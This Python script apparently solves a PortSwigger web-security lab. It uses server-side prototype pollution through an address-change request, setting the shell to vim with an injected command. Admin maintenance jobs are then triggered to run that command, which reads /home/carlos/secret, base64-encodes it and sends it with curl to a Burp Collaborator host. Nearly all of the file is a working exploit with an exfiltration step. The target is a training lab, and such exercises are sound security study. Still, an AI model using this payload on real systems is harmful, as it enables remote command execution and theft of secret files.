import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "username": username,
        "password": password,
        "csrf": get_csrf_token(s, url, path)
    }
    r = s.post(login_url, json=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def change_address(s, url, path, payload): 
    target_url = url + path
    r = s.post(target_url, json=payload, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Success update new address')
        print(r.text)
    else:
        print('[-] Fail to change address')
        sys.exit(-1)

def maintenance_job(s, url, path, csrf_path):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'sessionId': s.cookies.get_dict()['session'],
        'tasks':[
            'db-cleanup',
            'fs-cleanup'
        ]
    }
    r = s.post(target_url, json=payload)
    
    if 'Child process executed successfully' in r.text and r.status_code == 200:
        print(f'[+] Successful run maintenance jobs')
    else:
        print(f'[-] Failed to run maintenance jobs')

def submit(s, url, path, secret):
    submit_url = url + path
    payload = { 'answer': secret }
    r = s.post(submit_url, data=payload)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    username = 'wiener'
    password = 'peter'

    login_acc(s, url, '/login', username, password)
    burp_collab = input('Burp Collab domain name: ')
    payload = {
        "sessionId": s.cookies.get_dict()['session'],
        "__proto__": {
            "shell": "vim",
            "input": f":! cat /home/carlos/secret | base64 | curl -d @- http://{burp_collab}\n"
        }
    }
    change_address(s, url, '/my-account/change-address', payload)
    maintenance_job(s, url, '/admin/jobs', '/admin')
    secret = input('Base64 decode and put secret here: ')
    submit(s, url, '/submitSolution', secret)
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()